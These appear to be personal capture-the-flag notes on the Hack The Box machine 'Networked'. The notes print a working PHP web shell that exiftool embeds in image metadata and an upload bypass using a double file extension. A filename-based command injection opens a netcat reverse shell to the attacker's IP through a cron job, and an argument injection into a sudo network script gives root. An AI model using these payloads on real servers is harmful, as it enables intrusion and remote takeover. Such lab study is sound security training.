Summary:

Networked was a relatively easy machine who's exploitation relied on input handling vulnerabilities in code. 
Exploitation starts with finding a an open port 80, which shows a simple page with some text. Checking the source shows comments about an upload and gallery page. Using Dirbuster, the pages are found (/upload.php, and photos.php). Navigating to /upload allows the attacker to submit an image to be added to gallery.php. By changing the extension to photo.php.png, webshell code can be injected. Then, by viewing the image, code is executed, and the attacker can spawn a reverse shell as a very low privilege user: Apache. 
To capture the user.txt flag, the attacker must escalate to another account named guly. This is done by observing a cron job which runs every 3 minutes as guly, which performs an rm -f command on files in the /uploads directory. By 


==============================================
]]]]]]]]]]]]]]] Networked [[[[[[[[[]][[[[[[[[[
==============================================
Start: 10-3-19
User: 10-8-19
Root: 10-10-19


IP: 10.10.10.146
OS: Linux

Begin with nmap -sC -A 10.10.10.146
==============================================
Open ports: 22, 80
==============================================

Used nmap automator

http page talks about 2 guys and facemesh. Says upload and gallery dirs not yet linked. 

Dirbuster finds /uploads/, which is just a period on a blank page.

SSH accepts publickey,gssapi-keyex,gssapi-with-mic,password for authentication

upload.php allows for an image file upload

backup allows for download of backup.tar file

By using exiftool, I can embed php commands into an image. 

Command: 
exiftool -DocumentName="<h1 style="color:#942626\;">Chris's Shell #_</h1><h2>Command Result:<br />----------------------------------</h2><?php if(isset(\$_REQUEST['cmd'])){echo '<pre style="font-size:9pt\;color:#08ed00\;background-color:black\;">';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?>" dog.jpg

Then, using burp to change the name of the file to dog.php.jpg, it interprets as php code when viewing it. 

Going to the page it is uploaded to, then appending ?cmd = XXXX allows for rce.

I am user Apache, but they have nologin on the /etc/passwd file, so that is why a nc fails.

Enum:

No sudo perms

guly has 2 files on his /home that are interesting: 

crontab.guly
*/3 * * * * php /home/guly/check_attack.php
	
	This means tht every 3 minutes the 		check_attack file is executed.


Writable dirs:
/dev/mqueue
/dev/shm
/proc/7335/task/7335/fd
/proc/7335/fd
/proc/7335/map_files
/var/tmp
/var/lib/php/session
/var/lib/dav
/var/cache/httpd
/var/cache/httpd/proxy
/var/www/html/uploads
/tmp


Turns out that the way of getting a shell as guly is to use command:

touch "deleteme.txt ; nc 10.10.12.118 11527 -c bash"

which will create the file of that name, then call as guly. 


Can sudo use changename.sh

#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0



Machine is rooted by entering "\ bash" when running the script



Full nmap results
============================================

Nmap scan report for 10.10.10.146
Host is up (0.18s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 4.10 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Asus RT-AC66U WAP (90%), Linux 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   206.93 ms 10.10.12.1
2   207.73 ms 10.10.10.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.87 seconds
